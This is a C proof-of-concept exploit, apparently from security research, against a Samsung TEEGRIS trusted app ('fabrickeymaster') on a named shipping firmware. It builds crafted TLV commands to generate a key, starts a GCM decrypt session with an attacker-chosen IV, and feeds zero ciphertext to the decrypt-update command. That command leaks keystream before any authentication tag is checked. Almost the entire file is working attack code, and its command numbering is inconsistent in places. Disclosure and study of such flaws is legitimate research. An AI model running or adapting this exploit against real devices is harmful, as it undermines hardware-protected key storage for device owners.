/* FBCKMR-5 — Release of Unverified Plaintext (RUP) / unauthenticated streaming
 * AES-GCM decrypt oracle in fabrickeymaster (FbCkmR), cmd 9.
 *
 * Drives the decrypt *session* on the SHIPPING S921BXXSFDZE1 binary:
 *   cmd 1  CMD_FK_GENERATE_KEY   (algo=32 AES, keysize=256) -> 64B sealed blob
 *   cmd 8  CMD_FK_DECRYPT_INIT   (FK_TAG_IV 12B + the 64B sealed blob) -> session id
 *   cmd 9  CMD_FK_DECRYPT_UPDATE (FK_TAG_BLOB = attacker ciphertext + id) -> PLAINTEXT
 *
 * The claim under test: cmd 9 (fk_decrypt_update@0x1750C ->
 * fbckmr_aes_gcm_decrypt_update@0x11F50 = pure EVP_DecryptUpdate, no tag) returns
 * the decrypted bytes to the REE *before any GCM tag is set or verified* — the tag
 * is only ever touched in cmd 10 (fk_decrypt_final). So the emulator trace for the
 * cmd-9 window must show EVP_DecryptUpdate (plaintext written/returned) and ZERO
 * EVP_CIPHER_CTX_ctrl(SET_TAG)/EVP_DecryptFinal_ex. That is RUP.
 *
 * Wire format of params[0] (tz_process_command@0xF250 / deserialize@0xCC18):
 *     [u32 cmd_id][u32 payload_len L][TLV items...]      total = L + 8
 *   TLV bytes item:   [u32 tag (hi byte 0x02)][u32 len][len bytes]
 *   TLV integer item: [u32 tag (hi byte 0x01)][u32 value]
 * param_types == 0x65 (MEMREF_TEMP_INPUT, MEMREF_TEMP_OUTPUT, NONE, NONE).
 *
 * Tags are HANDLER-authoritative (the RE/samsung_teegris/fbckmr.md tag table is
 * stale for several of these — e.g. FK_TAG_IV is 0x02000011 in fk_decrypt_init,
 * not 0x02000005):
 */
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

#define BUFSZ 8192

#define FK_TAG_INTEGER       0x01000002u   /* session id (in/out)        */
#define FK_TAG_ALGO_INT      0x01000003u   /* gen_key algo  (32 = AES)   */
#define FK_TAG_ALGO_KEY_SIZE 0x01000004u   /* gen_key keysz (256)        */
#define FK_TAG_BLOB          0x02000003u   /* generic byte blob          */
#define FK_TAG_IV            0x02000011u   /* cmd-8 decrypt IV (len 12)  */

static inline void put_u32(uint8_t *p, uint32_t v){ memcpy(p, &v, 4); }
static inline uint32_t get_u32(const uint8_t *p){ uint32_t v; memcpy(&v, p, 4); return v; }

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337 2>/dev/null"); system("ipcrm -M 0x13338 2>/dev/null");
    system("ipcrm -M 0x13339 2>/dev/null"); system("ipcrm -M 0x1333a 2>/dev/null");
#endif
}

/* Append a TLV integer item. */
static uint32_t add_int(uint8_t *in, uint32_t off, uint32_t tag, uint32_t val){
    put_u32(in+off, tag); put_u32(in+off+4, val); return off+8;
}
/* Append a TLV bytes item. */
static uint32_t add_blob(uint8_t *in, uint32_t off, uint32_t tag, const void *data, uint32_t len){
    put_u32(in+off, tag); put_u32(in+off+4, len); memcpy(in+off+8, data, len); return off+8+len;
}
/* Finalize header: [cmd][L]. off = total bytes used. */
static void finalize(uint8_t *in, uint32_t cmd, uint32_t off){
    put_u32(in+0, cmd); put_u32(in+4, off-8);
}

/* Scan a response buffer for the FIRST occurrence of `tag` (dword, LE) and return
 * a pointer to the bytes that follow it; sets *out_len for a bytes item (the u32
 * after the tag), or 0xFFFFFFFF if you should read 4 bytes as an int value. */
static const uint8_t* find_tag(const uint8_t *buf, uint32_t size, uint32_t tag,
                               uint32_t *out_len){
    for (uint32_t i = 0; i + 8 <= size; i++){
        if (get_u32(buf+i) == tag){
            uint32_t nxt = get_u32(buf+i+4);
            if ((tag >> 24) == 0x02){            /* bytes item: nxt = len */
                if (nxt <= size - (i+8)) { *out_len = nxt; return buf+i+8; }
            } else {                              /* int item: nxt = value */
                *out_len = 0xFFFFFFFFu; return buf+i+4;
            }
        }
    }
    return NULL;
}

static void hexdump(const char *label, const uint8_t *p, uint32_t n){
    printf("    %s (%u): ", label, n);
    for (uint32_t i=0;i<n && i<32;i++) printf("%02x", p[i]);
    printf("%s\n", n>32?"...":"");
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-4662436b6d52";
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin; TEEC_Result res;
    TEEC_Context context; TEEC_Session session; TEEC_Operation op;

    cleanup_shm(); load_functions();
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS){ printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS){ printf("OpenSession failed 0x%x\n", res); exit(-1); }
    printf("[poc] session opened\n");

    uint8_t* in  = (uint8_t*)allocate_param_mem(&context, BUFSZ);
    uint8_t* out = (uint8_t*)allocate_param_mem(&context, BUFSZ);
    if (!in || !out){ printf("[poc] alloc failed\n"); exit(-1); }

    #define INVOKE(cmd) do { \
        memset(&op,0,sizeof(op)); \
        op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT, TEEC_NONE, TEEC_NONE); \
        op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = BUFSZ; \
        op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = BUFSZ; \
        res = TEEC_InvokeCommand_impl(&session, (cmd), &op, &err_origin); \
    } while(0)

    /* ---- cmd 1: GENERATE_KEY (AES-256) -> 64B sealed blob ---- */
    memset(in,0,BUFSZ); memset(out,0,BUFSZ);
    uint32_t off = 8;
    off = add_int(in, off, FK_TAG_ALGO_INT, 32);
    off = add_int(in, off, FK_TAG_ALGO_KEY_SIZE, 256);
    finalize(in, 0, off);   /* wire cmd 0 = GENERATE_KEY (dense dispatch) */
    printf("[poc] >>> cmd 0 GENERATE_KEY (algo=32 AES, keysize=256), req %u bytes\n", off);
    INVOKE(0);
    printf("[poc] <<< cmd 0 rc=0x%x origin=0x%x\n", res, err_origin);
    printf("[poc] raw cmd-0 response out[0..128]:\n");
    for (int r=0;r<128;r+=16){ printf("    %04x: ", r); for(int c=0;c<16;c++) printf("%02x", out[r+c]); printf("\n"); }

    uint32_t blob_len = 0;
    const uint8_t *blob = find_tag(out, BUFSZ, FK_TAG_BLOB, &blob_len);
    if (!blob){ printf("[poc] FAIL: no FK_TAG_BLOB sealed key in cmd-0 response\n"); goto done; }
    uint8_t sealed[256]; if (blob_len>sizeof(sealed)) blob_len=sizeof(sealed);
    memcpy(sealed, blob, blob_len);
    printf("[poc] cmd-0 FK_TAG_BLOB item len=%u\n", blob_len);
    hexdump("raw_item", sealed, blob_len);
    /* item = [u32 inner_len][inner_len bytes SO blob]; cmd 6 wants exactly the 64B SO blob */
    const uint8_t *so = sealed; uint32_t so_len = blob_len;
    if (blob_len>=4 && get_u32(sealed)==blob_len-4){ so = sealed+4; so_len = blob_len-4; }
    printf("[poc] stripped SO blob, len=%u (cmd 6 wants exactly 64)\n", so_len);
    hexdump("so_blob", so, so_len);

    /* ---- cmd 8: DECRYPT_INIT (FK_TAG_IV 12B + 64B sealed blob) -> session id ---- */
    memset(in,0,BUFSZ); memset(out,0,BUFSZ);
    uint8_t iv[12]; memset(iv, 0x11, sizeof(iv));   /* attacker-chosen GCM IV */
    off = 8;
    off = add_blob(in, off, FK_TAG_IV, iv, sizeof(iv));
    off = add_blob(in, off, FK_TAG_BLOB, so, so_len);
    finalize(in, 8, off);   /* wire cmd 8 = DECRYPT_INIT */
    printf("[poc] >>> cmd 8 DECRYPT_INIT (IV=0x11*12 + sealed blob), req %u bytes\n", off);
    INVOKE(8);
    printf("[poc] <<< cmd 8 rc=0x%x origin=0x%x\n", res, err_origin);
    printf("[poc] raw cmd-8 response out[0..64]:\n");
    for (int r=0;r<64;r+=16){ printf("    %04x: ", r); for(int c=0;c<16;c++) printf("%02x", out[r+c]); printf("\n"); }

    uint32_t idlen=0;
    const uint8_t *idp = find_tag(out, BUFSZ, FK_TAG_INTEGER, &idlen);
    uint32_t sid = 0; int have_id = 0;
    if (idp){ sid = get_u32(idp); have_id = 1; printf("[poc] session id = %u\n", sid); }
    else printf("[poc] WARN: no FK_TAG_INTEGER id in cmd-8 response; will try id=0/1\n");

    /* ---- cmd 9: DECRYPT_UPDATE (attacker ciphertext) -> PLAINTEXT, NO TAG ---- */
    uint8_t ct[16]; memset(ct, 0x00, sizeof(ct));   /* C=0^n -> P = keystream (oracle) */
    uint32_t try_ids[3]; int ntry=0;
    if (have_id) try_ids[ntry++]=sid;
    try_ids[ntry++]=0; try_ids[ntry++]=1;
    for (int t=0; t<ntry; t++){
        memset(in,0,BUFSZ); memset(out,0,BUFSZ);
        off = 8;
        off = add_blob(in, off, FK_TAG_BLOB, ct, sizeof(ct));
        off = add_int(in, off, FK_TAG_INTEGER, try_ids[t]);
        finalize(in, 9, off);   /* wire cmd 9 = DECRYPT_UPDATE */
        printf("[poc] >>> cmd 9 DECRYPT_UPDATE (ciphertext=0x00*16, id=%u), req %u bytes\n", try_ids[t], off);
        INVOKE(9);
        printf("[poc] <<< cmd 9 rc=0x%x origin=0x%x\n", res, err_origin);
        if (res == TEEC_SUCCESS){
            uint32_t plen=0;
            const uint8_t *pt = find_tag(out, BUFSZ, FK_TAG_BLOB, &plen);
            if (pt){
                printf("[poc] *** RUP CONFIRMED: cmd 7 (logical cmd 9) RELEASED PLAINTEXT with NO cmd-10 / NO tag check ***\n");
                hexdump("released_plaintext", pt, plen);
                printf("[poc] (C=0 -> P=keystream; an attacker now holds KS for this (key,IV))\n");
            }
            break;
        }
    }
done:
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
